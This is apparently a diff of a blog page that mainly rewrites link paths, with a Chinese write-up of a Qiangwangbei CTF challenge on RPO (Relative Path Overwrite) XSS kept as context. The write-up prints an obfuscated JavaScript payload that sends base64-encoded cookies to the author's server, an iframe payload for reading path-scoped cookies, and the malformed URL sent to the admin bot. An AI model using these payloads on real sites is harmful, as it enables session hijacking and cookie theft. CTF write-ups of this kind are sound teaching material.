@@ -18,23 +18,23 @@
 
 
 
-    <link rel="icon" href="/blog/favicon.ico">
+    <link rel="icon" href="/favicon.ico">
 
 
 
 
     <!-- stylesheets list from _config.yml -->
     
-    <link rel="stylesheet" href="/blog/css/style.css">
+    <link rel="stylesheet" href="/css/style.css">
     
 
 
 
     <!-- scripts list from _config.yml -->
     
-    <script src="/blog/js/script.js"></script>
+    <script src="/js/script.js"></script>
     
-    <script src="/blog/js/tocbot.min.js"></script>
+    <script src="/js/tocbot.min.js"></script>
     
 
 
@@ -47,7 +47,7 @@
   <!-- for theme: default is false -->
   <!-- for page: default is true -->
 
-<link rel="stylesheet" href="/blog/js/fancybox/jquery.fancybox.min.css">
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
 
 
 
@@ -62,16 +62,16 @@
         <header>
     <nav class="navbar">
         <div class="container">
-            <div class="navbar-header header-logo"><a href="/blog/">Home</a></div>
+            <div class="navbar-header header-logo"><a href="/">Home</a></div>
             <div class="menu navbar-right">
                 
-                    <a class="menu-item" href="/blog/archives">Posts</a>
+                    <a class="menu-item" href="/archives">Posts</a>
                 
-                    <a class="menu-item" href="/blog/category">Categories</a>
+                    <a class="menu-item" href="/category">Categories</a>
                 
-                    <a class="menu-item" href="/blog/tag">Tags</a>
+                    <a class="menu-item" href="/tag">Tags</a>
                 
-                    <a class="menu-item" href="/blog/about">About</a>
+                    <a class="menu-item" href="/about">About</a>
                 
                 <input id="switch_default" type="checkbox" class="switch_default">
                 <label for="switch_default" class="toggleBtn"></label>
@@ -84,19 +84,19 @@
         <div class="container">
             <div class="navbar-header">
                 <div>
-                    <a href="/blog/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                    <a href="/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                 </div>
                 <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
             </div>
             <div class="menu" id="mobile-menu">
                 
-                    <a class="menu-item" href="/blog/archives">Posts</a>
+                    <a class="menu-item" href="/archives">Posts</a>
                 
-                    <a class="menu-item" href="/blog/category">Categories</a>
+                    <a class="menu-item" href="/category">Categories</a>
                 
-                    <a class="menu-item" href="/blog/tag">Tags</a>
+                    <a class="menu-item" href="/tag">Tags</a>
                 
-                    <a class="menu-item" href="/blog/about">About</a>
+                    <a class="menu-item" href="/about">About</a>
                 
             </div>
         </div>
@@ -206,7 +206,7 @@
                         <span class="post-category">
                     Category:
                             
-                                <a href="/blog/category/CTF/">CTF</a>
+                                <a href="/category/CTF/">CTF</a>
                             
                         </span>
                     
@@ -215,7 +215,7 @@
         </header>
 
         <div class="post-content">
-            <p><img src="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/userid363214time20141028063048at22.jpg"></p>
+            <p><img src="/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/userid363214time20141028063048at22.jpg"></p>
 <blockquote>
 <p>一种新的XSS攻击手法 以强网杯中的一道Web题为例做解析</p>
 </blockquote>
@@ -226,25 +226,25 @@ Overwrite)攻击，原理一句话概括就是利用服务器和客户端浏览�
 # 本地演示 我们搭建本地环境来演示一下这个攻击，来一个比较直观的感官认识
 首先我们的目录结构是这样的 pro │ 1.php │ common.js ├─ bbb │ common.js
 在/pro目录下的common.js中是弹一个<code>common function</code>的窗</p>
-<p><img src="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10-11-22.jpg">
+<p><img src="/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10-11-22.jpg">
 而/pro/bbb目录下的common.js中是弹一个<code>Evil function</code>的窗，代表这是一个我们可控的界面，然后写了个恶意的js脚本
-<img src="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10-11-58.jpg">
+<img src="/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10-11-58.jpg">
 然后我们在1.php中引用了../../common.js</p>
-<p><img src="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10-18-51.jpg">
+<p><img src="/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10-18-51.jpg">
 需要注意的是，我们在.htaccess中rewrite了1.php地址 当我们访问</p>
 <pre class="url"><code>http://localhost/pro/1.php/test/1234</code></pre>
 <p>就相当于访问</p>
 <pre class="url"><code>http://localhost/pro/1.php?user=test&amp;id=1234</code></pre>
-<p><img src="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10-19-11.jpg">
+<p><img src="/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10-19-11.jpg">
 这个在.htaccess里面很好实现，就是简化了传参方式，作用就是直观和简洁
 访问在这个网址就会调用<code>../../common.js</code> 即</p>
 <pre class="url"><code>http://localhost/pro/1.php/test/1234/../../common.js =&gt; http://localhost/pro/tecommon.js</code></pre>
-<p>弹出了<code>common function</code>框 <img src="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10-21-00.jpg"></p>
+<p>弹出了<code>common function</code>框 <img src="/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10-21-00.jpg"></p>
 <p>一切看起来很正常，但是当我们输入这样的地址时</p>
 <pre class="url"><code>http://localhost/pro/1.php/test%2f1234</code></pre>
-<p><img src="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10-23-00.jpg">
+<p><img src="/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10-23-00.jpg">
 php解释器依旧正常解析，然而客户端的浏览器就出现问题了，它现在调用<code>../../common.js</code>却是在请求<code>http://localhost/common.js</code>
-<img src="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10-25-20.jpg">
+<img src="/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10-25-20.jpg">
 很容易我们可以意识到一个问题，服务器和浏览器对网址的解析出现了差异
 服务器对地址</p>
 <pre class="url"><code>http://localhost/pro/1.php/test%2f1234</code></pre>
@@ -259,19 +259,19 @@ php解释器依旧正常解析，然而客户端的浏览器就出现问题了�
 <pre class="url"><code>http://localhost/pro/bbb/..%2f1.php/test/123</code></pre>
 <p>即<code>http://localhost/pro/</code><del>bbb/..%2f</del><code>1.php/test/123</code>
 =&gt; <code>http://localhost/pro/1.php/test/123</code></p>
-<p><img src="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10-33-02.jpg">
+<p><img src="/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10-33-02.jpg">
 服务器正常访问而对于浏览器来说，引用<code>../../common.js</code>却是这样的
 <code>http://localhost/pro/bbb/</code><del>..%2f1.php/test/123/../../</del><code>common.js</code>
 然后就访问了<code>http://localhost/pro/bbb/common.js</code>，然后执行了里面的JS代码</p>
-<p><img src="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10-37-01.jpg">
+<p><img src="/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10-37-01.jpg">
 对于.CSS等静态文件也是一样的原理(css里面用expression也可以执行一些敏感操作)
 对此我们可以执行任意可控的静态页面(反过来我们也可以将动态页面当静态页面获取源码)
 ## Apache配置 1.打开Apache 的 mod_rewrite模块</p>
-<p><img src="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10-42-54.jpg"></p>
+<p><img src="/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10-42-54.jpg"></p>
 <p>在httpd.conf中去掉注释LoadModule rewrite_module
 modules/mod_rewrite.so的<code>#</code>即可
 2.在httpd.conf中网站目录下的<Directory>把AllowOverride
-none改为AllowOverride All <img src="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10-45-24.jpg">
+none改为AllowOverride All <img src="/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10-45-24.jpg">
 3.在httpd.conf末尾加上AllowEncodedSlashes
 On这句，表示允许在地址中<code>%2f</code> <code>/</code>
 <code>\</code>等斜杠 4.在网站根目录下创建.htaccess文件,内容如下:</Directory></p>
@@ -282,10 +282,10 @@ On这句，表示允许在地址中<code>%2f</code> <code>/</code>
 <span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="er">&lt;/ifmodule&gt;</span></span></code></pre></div>
 <h1 id="以ctf题为例">以CTF题为例</h1>
 <p>我们现在以强网杯中的一道XSS题为例，演示RPO攻击
-首先进去是一个登陆的界面 <img src="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/00-19-02.jpg"></p>
+首先进去是一个登陆的界面 <img src="/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/00-19-02.jpg"></p>
 <p>随便注册个账号进去，发现了一个留言板和一个提交网址的界面</p>
-<p><img src="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/00-20-10.jpg"> <img src="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/00-20-16.jpg"> 玩过XSS的同学都知道这个验证码预示着啥
-于是我将大量时间研究这里，直到出现了第二个Hint <img src="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10-51-12.jpg"></p>
+<p><img src="/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/00-20-10.jpg"> <img src="/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/00-20-16.jpg"> 玩过XSS的同学都知道这个验证码预示着啥
+于是我将大量时间研究这里，直到出现了第二个Hint <img src="/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10-51-12.jpg"></p>
 <p>确实有点气 分析一下
 <code>index.php</code>部分明显用了重写如地址<code>http://39.107.33.96:20000/index.php/view/article/1729</code>应该等于<code>http://39.107.33.96:20000/index.php?mod=view&amp;type=article&amp;id=1729</code>
 + 在write
@@ -295,10 +295,10 @@ index.php用相对路径引用了
 <code>static/js/jquery.min.js</code>和<code>static/js/index.js</code>
 我们尝试一下随便写个<code>12345</code>进article
 然后访问地址<code>http://39.107.33.96:20000/index.php/view/article/1729</code></p>
-<p><img src="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/11-15-07.jpg">
+<p><img src="/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/11-15-07.jpg">
 当我们在这个地址后面随便加点东西时：</p>
 <pre class="url"><code>http://39.107.33.96:20000/index.php/view/article/1729/12rfv1g/sfw2ghvneov/cfv32jvnniob</code></pre>
-<p><img src="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/11-17-41.jpg"> 仍然解析正确
+<p><img src="/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/11-17-41.jpg"> 仍然解析正确
 我们可以理解为后面乱输入的几个参数并没有对应代码处理，也就被忽略了，前面几个参数则正确处理，显示了正确的文章
 如访问一个网站<code>http://www.wzsite.cn?name=test&amp;age=666</code>，然而站点里面并没有<code>name</code>和<code>age</code>对应参数处理，但是服务依旧会正常执行
 是不是很熟悉？ 对的，就是RPO攻击 我们基本确定思路为： 1.
@@ -308,14 +308,14 @@ index.php用相对路径引用了
 <p>我们首先构造这样的一个payload，绕过对尖括号和单双引号的转义：</p>
 <div class="sourceCode" id="cb10"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a>(<span class="kw">new</span> <span class="fu">Image</span>())<span class="op">.</span><span class="at">src</span> <span class="op">=</span> <span class="bu">String</span><span class="op">.</span><span class="fu">fromCharCode</span>(<span class="dv">104</span><span class="op">,</span> <span class="dv">116</span><span class="op">,</span> <span class="dv">116</span><span class="op">,</span> <span class="dv">112</span><span class="op">,</span> <span class="dv">58</span><span class="op">,</span> <span class="dv">47</span><span class="op">,</span> <span class="dv">47</span><span class="op">,</span> <span class="dv">119</span><span class="op">,</span> <span class="dv">119</span><span class="op">,</span> <span class="dv">119</span><span class="op">,</span> <span class="dv">46</span><span class="op">,</span> <span class="dv">119</span><span class="op">,</span> <span class="dv">122</span><span class="op">,</span> <span class="dv">115</span><span class="op">,</span> <span class="dv">105</span><span class="op">,</span> <span class="dv">116</span><span class="op">,</span> <span class="dv">101</span><span class="op">,</span> <span class="dv">46</span><span class="op">,</span> <span class="dv">99</span><span class="op">,</span> <span class="dv">110</span><span class="op">,</span> <span class="dv">58</span><span class="op">,</span> <span class="dv">50</span><span class="op">,</span> <span class="dv">53</span><span class="op">,</span> <span class="dv">48</span><span class="op">,</span> <span class="dv">49</span><span class="op">,</span> <span class="dv">63</span><span class="op">,</span> <span class="dv">99</span><span class="op">,</span> <span class="dv">111</span><span class="op">,</span> <span class="dv">111</span><span class="op">,</span> <span class="dv">61</span>)<span class="op">+</span><span class="fu">btoa</span>(<span class="bu">document</span><span class="op">.</span><span class="at">cookie</span>)<span class="op">;</span></span></code></pre></div>
 <p>大意就是new一个image，然后设置src=<code>http://my_VPS:port?coo=</code>+bbtoa(document.cookie),btoa()是base64编码</p>
-<p><img src="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/11-04-37.jpg">
+<p><img src="/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/11-04-37.jpg">
 将在article里面写入payload，得到如下
-<code>http://39.107.33.96:20000/index.php/view/article/1546</code> <img src="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/11-22-53.jpg">
+<code>http://39.107.33.96:20000/index.php/view/article/1546</code> <img src="/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/11-22-53.jpg">
 然后我们在VPS打开2501端口侦听(当然你也可以放到xss平台)
 随后我们测试一下，访问地址</p>
 <pre class="url"><code>http://39.107.33.96:20000/index.php/view/article/1546/..%2f..%2f..%2f..%2findex.php</code></pre>
 <p>发现我们的vps的2501端口接受到了请求：</p>
-<p><img src="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/11-25-55.jpg">
+<p><img src="/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/11-25-55.jpg">
 这是因为当我们访问地址<code>http://39.107.33.96:20000/index.php/view/article/1546/..%2f..%2f..%2f..%2findex.php</code>
 对于服务器来说我们访问的是
 <code>http://39.107.33.96:20000/</code><del>index.php/view/article/1546/..%2f..%2f..%2f..%2f</del><code>index.php</code>
@@ -327,9 +327,9 @@ index.php用相对路径引用了
 所以现在我们将这个畸形的地址发给admin访问就能获取到cookie了
 此外那个验证码自己用python写个脚本碰撞一下就好了，我的做法是事先生成一个一一对应的类似于字典的东西，然后每次只需要读文件而不需要重新计算，会快很多，拿空间换时间嘛
 提交之后我们的vps就会收到请求了</p>
-<p><img src="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/14-53-25.jpg"></p>
+<p><img src="/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/14-53-25.jpg"></p>
 <p>所以我们base64解码一下传回来的<code>coo</code></p>
-<p><img src="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/14-56-27.jpg"></p>
+<p><img src="/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/14-56-27.jpg"></p>
 <p>就会发现一个<code>hint</code>，叫我们去读取<code>/QWB_fl4g/QWB/</code>下的cookie
 那么我们需要用iframe进行同域cookie读取，payload如下：</p>
 <div class="sourceCode" id="cb14"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> iframe <span class="op">=</span> <span class="bu">document</span><span class="op">.</span><span class="fu">createElement</span>(<span class="bu">String</span><span class="op">.</span><span class="fu">fromCharCode</span>(<span class="dv">105</span><span class="op">,</span> <span class="dv">102</span><span class="op">,</span> <span class="dv">114</span><span class="op">,</span> <span class="dv">97</span><span class="op">,</span> <span class="dv">109</span><span class="op">,</span> <span class="dv">101</span>))<span class="op">;</span><span class="co">//create一个iframe</span></span>
@@ -341,7 +341,7 @@ index.php用相对路径引用了
 <p>然后一样写进article，然后再将对应的畸形url
 report给admin，就可以收到flag了
 唯一需要注意的是写js的payload的时候需要等iframe加载完毕之后再跳转，不然带不出flag
-<img src="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/15-04-26.jpg"></p>
+<img src="/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/15-04-26.jpg"></p>
 <div class="sourceCode" id="cb15"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> ZmxhZz1RV0IlN0JmbGFnX2lzX2Y0M2t0aDRycG8lN0Q7IJTlQ9VHJ5IHRvIGdldCB0aGUgY29va2llIG9mIHBhdGggIi9RV0JfZmw0Zy9RV0IvIg== <span class="kw">|</span> <span class="fu">base64</span> <span class="at">-d</span></span>
 <span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="va">flag</span><span class="op">=</span>QWB%7Bflag_is_f43kth4rpo%7D<span class="kw">;</span> <span class="va">HINT</span><span class="op">=</span>Try <span class="ex">to</span> get the cookie of path <span class="st">&quot;/QWB_fl4g/QWB/&quot;</span></span></code></pre></div>
 <p>获得flag <code>QWB&#123;flag_is_f43kth4rpo&#125;</code> ### RPO 解决方案 +
@@ -373,7 +373,7 @@ https://xz.aliyun.com/t/2220</a> <a target="_blank" rel="noopener" href="http://
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="https://testzero-wz.github.io/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/">https://testzero-wz.github.io/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/</a></span>
+                        <span><a href="https://www.testzero-wz.com/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/">https://www.testzero-wz.com/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/</a></span>
                     </p>
                 
                 
@@ -392,9 +392,9 @@ https://xz.aliyun.com/t/2220</a> <a target="_blank" rel="noopener" href="http://
                 <span class="tag">
                     
                     
-                        <a href="/blog/tag/CTF/"># CTF</a>
+                        <a href="/tag/CTF/"># CTF</a>
                     
-                        <a href="/blog/tag/%E6%80%BB%E7%BB%93/"># 总结</a>
+                        <a href="/tag/%E6%80%BB%E7%BB%93/"># 总结</a>
                     
                         
                 </span>
@@ -402,15 +402,15 @@ https://xz.aliyun.com/t/2220</a> <a target="_blank" rel="noopener" href="http://
             <div>
                 <a href="javascript:window.history.back();">back</a>
                 <span>· </span>
-                <a href="/blog/">home</a>
+                <a href="/">home</a>
             </div>
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/blog/2018/04/06/%E5%86%99%E4%B8%80%E4%B8%AAARP%E6%AC%BA%E9%AA%97%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7/">写一个ARP欺骗的命令行工具</a>
+                <a class="prev" rel="prev" href="/2018/04/06/%E5%86%99%E4%B8%80%E4%B8%AAARP%E6%AC%BA%E9%AA%97%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7/">写一个ARP欺骗的命令行工具</a>
             
             
-            <a class="next" rel="next" href="/blog/2018/03/26/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-QWB-%E9%83%A8%E5%88%86Writeup/">第二届强网杯-QWB-部分Writeup</a>
+            <a class="next" rel="next" href="/2018/03/26/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-QWB-%E9%83%A8%E5%88%86Writeup/">第二届强网杯-QWB-部分Writeup</a>
             
         </section>
 
@@ -431,5 +431,22 @@ https://xz.aliyun.com/t/2220</a> <a target="_blank" rel="noopener" href="http://
 <script>hljs.highlightAll();</script>
 
     </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script> -->
+
+<script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
 </body>
 </html>
